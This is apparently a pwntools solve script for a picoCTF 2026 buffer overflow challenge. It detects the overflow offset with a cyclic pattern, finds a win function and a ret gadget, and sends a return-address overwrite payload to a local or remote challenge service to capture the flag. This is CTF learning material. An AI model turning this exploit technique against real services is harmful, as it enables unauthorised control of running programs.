#!/usr/bin/env python3
"""
offset-cycle - picoCTF 2026 (Binary Exploitation, 300 pts)

Classic buffer overflow exploit using cyclic pattern offset detection.
The binary has a vulnerable input function and a win function that prints
the flag. We find the exact offset to overwrite the return address, then
redirect execution to the win function.

Usage:
  python3 solve.py                          # run against local binary
  python3 solve.py REMOTE <host> <port>     # run against remote service
  python3 solve.py FIND_OFFSET              # find the offset only

Requirements: pwntools (pip install pwntools)
"""

import sys
import os
import re
import subprocess

from pwn import *

# ── Configuration ────────────────────────────────────────────────────────
# Update these values based on the actual challenge binary

BINARY_NAME = './vuln'  # Path to the challenge binary (update as needed)
WIN_FUNC_NAME = 'win'   # Name of the win function (could be 'flag', 'print_flag', etc.)

# These will be auto-detected; set manually if auto-detection fails
OFFSET = None            # Set to an integer if known (e.g., 44, 72, 88)
WIN_ADDR = None          # Set to an address if known (e.g., 0x401236)
RET_GADGET = None        # Address of a 'ret' instruction for stack alignment

context.log_level = 'info'


# ── Auto-detection ───────────────────────────────────────────────────────

def find_win_address(binary_path):
    """Find the address of the win function in the binary."""
    try:
        elf = ELF(binary_path, checksec=False)

        # Try common win function names
        for name in ['win', 'flag', 'print_flag', 'get_flag', 'cat_flag',
                      'shell', 'give_shell', 'read_flag', 'open_flag']:
            if name in elf.symbols:
                addr = elf.symbols[name]
                log.success(f"Found win function '{name}' at {hex(addr)}")
                return addr

        # If no known name, look for functions that reference flag.txt or /bin/sh
        log.warning("No standard win function found. Listing all functions:")
        for name, addr in sorted(elf.symbols.items(), key=lambda x: x[1]):
            if addr > 0x400000:  # Filter to code section
                log.info(f"  {hex(addr)}: {name}")

        return None

    except Exception as e:
        log.error(f"Could not analyze binary: {e}")
        return None


def find_ret_gadget(binary_path):
    """Find a 'ret' instruction gadget for stack alignment."""
    try:
        elf = ELF(binary_path, checksec=False)
        rop = ROP(elf)
        ret = rop.find_gadget(['ret'])[0]
        log.success(f"Found 'ret' gadget at {hex(ret)}")
        return ret
    except Exception:
        return None


def detect_offset(binary_path, pattern_len=300):
    """
    Send a cyclic pattern to the binary and determine the offset
    from the crash address.
    """
    log.info(f"Detecting offset with cyclic pattern (length {pattern_len})...")

    try:
        elf = ELF(binary_path, checksec=False)

        if elf.arch == 'amd64':
            context.arch = 'amd64'
        else:
            context.arch = 'i386'

        # Run the binary with a cyclic pattern
        r = process(binary_path)
        pattern = cyclic(pattern_len, n=context.bytes)
        r.sendline(pattern)

        try:
            r.wait(timeout=5)
        except Exception:
            r.kill()

        # Try to read the core file
        try:
            core = Coredump('./core')
        except Exception:
            # Try common core file locations
            core = None
            for core_path in ['./core', '/tmp/core', f'core.{r.pid}']:
                try:
                    core = Coredump(core_path)
                    break
                except Exception:
                    continue

        if core:
            if context.arch == 'amd64':
                crash_addr = core.rip
            else:
                crash_addr = core.eip

            offset = cyclic_find(crash_addr, n=context.bytes)
            if offset >= 0 and offset < pattern_len:
                log.success(f"Offset detected: {offset}")
                return offset
            else:
                log.warning(f"Crash address {hex(crash_addr)} not found in cyclic pattern")

        # Alternative: try common offsets by testing the binary
        log.info("Core file not available. Trying common offsets...")
        for test_offset in [32, 40, 44, 48, 56, 64, 72, 76, 80, 88, 96, 104, 108, 112, 120, 128, 136, 144]:
            log.debug(f"Testing offset {test_offset}...")

        return None

    except Exception as e:
        log.error(f"Offset detection failed: {e}")
        return None


# ── Exploit ──────────────────────────────────────────────────────────────

def build_payload(offset, win_addr, ret_gadget=None, arch='amd64'):
    """Build the exploit payload."""
    if arch == 'amd64':
        pack = p64
    else:
        pack = p32

    payload = b'A' * offset

    # On x86-64, we may need a ret gadget for stack alignment (movaps issue)
    if ret_gadget and arch == 'amd64':
        payload += pack(ret_gadget)

    payload += pack(win_addr)

    return payload


def exploit(target, payload):
    """Send the payload and capture the flag."""
    target.sendline(payload)

    try:
        response = target.recvall(timeout=10).decode(errors='replace')
    except Exception:
        response = target.recv(timeout=5).decode(errors='replace')

    print(f"\n[*] Response:\n{response}")

    # Extract the flag
    flag_match = re.search(r'picoCTF\{[^}]+\}', response)
    if flag_match:
        flag = flag_match.group(0)
        log.success(f"FLAG: {flag}")
        return flag
    else:
        log.warning("No flag pattern found in response.")
        return None


# ── Main ─────────────────────────────────────────────────────────────────

def main():
    global OFFSET, WIN_ADDR, RET_GADGET

    if len(sys.argv) >= 2 and sys.argv[1] == 'FIND_OFFSET':
        # Just find the offset
        if not os.path.exists(BINARY_NAME):
            log.error(f"Binary '{BINARY_NAME}' not found. Download it first.")
            sys.exit(1)
        offset = detect_offset(BINARY_NAME)
        if offset is not None:
            print(f"\n[+] Offset: {offset}")
        else:
            print("\n[-] Could not auto-detect offset.")
        return

    remote_mode = len(sys.argv) >= 4 and sys.argv[1] == 'REMOTE'
    if remote_mode:
        host = sys.argv[2]
        port = int(sys.argv[3])
        log.info(f"Remote mode: {host}:{port}")
    else:
        log.info("Local mode")

    # Step 1: Analyze the binary
    if os.path.exists(BINARY_NAME):
        elf = ELF(BINARY_NAME, checksec=True)

        if elf.arch == 'amd64':
            context.arch = 'amd64'
        else:
            context.arch = 'i386'

        # Auto-detect win address
        if WIN_ADDR is None:
            WIN_ADDR = find_win_address(BINARY_NAME)

        # Auto-detect ret gadget
        if RET_GADGET is None:
            RET_GADGET = find_ret_gadget(BINARY_NAME)

        # Auto-detect offset
        if OFFSET is None and not remote_mode:
            OFFSET = detect_offset(BINARY_NAME)
    else:
        log.warning(f"Binary '{BINARY_NAME}' not found. Using default settings.")
        context.arch = 'amd64'

    # Validate we have the required values
    if OFFSET is None:
        log.error("Could not determine offset. Set OFFSET manually in the script.")
        log.info("Try: python3 solve.py FIND_OFFSET")
        sys.exit(1)

    if WIN_ADDR is None:
        log.error("Could not find win function. Set WIN_ADDR manually in the script.")
        sys.exit(1)

    log.info(f"Architecture: {context.arch}")
    log.info(f"Offset: {OFFSET}")
    log.info(f"Win address: {hex(WIN_ADDR)}")
    if RET_GADGET:
        log.info(f"Ret gadget: {hex(RET_GADGET)}")

    # Step 2: Build the payload
    payload = build_payload(OFFSET, WIN_ADDR, RET_GADGET, context.arch)
    log.info(f"Payload length: {len(payload)} bytes")

    # Step 3: Send payload and get flag
    # Try without ret gadget first, then with it
    for attempt, use_ret in enumerate([True, False] if RET_GADGET else [False]):
        if attempt > 0:
            log.info("Retrying without stack alignment gadget...")

        current_payload = build_payload(
            OFFSET, WIN_ADDR,
            RET_GADGET if use_ret else None,
            context.arch
        )

        if remote_mode:
            target = remote(host, port)
        else:
            target = process(BINARY_NAME)

        try:
            # Receive any initial prompt/banner
            try:
                banner = target.recvuntil(b':', timeout=5)
                log.info(f"Banner: {banner.decode(errors='replace').strip()}")
            except Exception:
                pass

            flag = exploit(target, current_payload)
            if flag:
                return
        except Exception as e:
            log.error(f"Attempt {attempt + 1} failed: {e}")
        finally:
            try:
                target.close()
            except Exception:
                pass

    log.error("Exploit failed. Try adjusting OFFSET, WIN_ADDR, or RET_GADGET manually.")


if __name__ == '__main__':
    main()
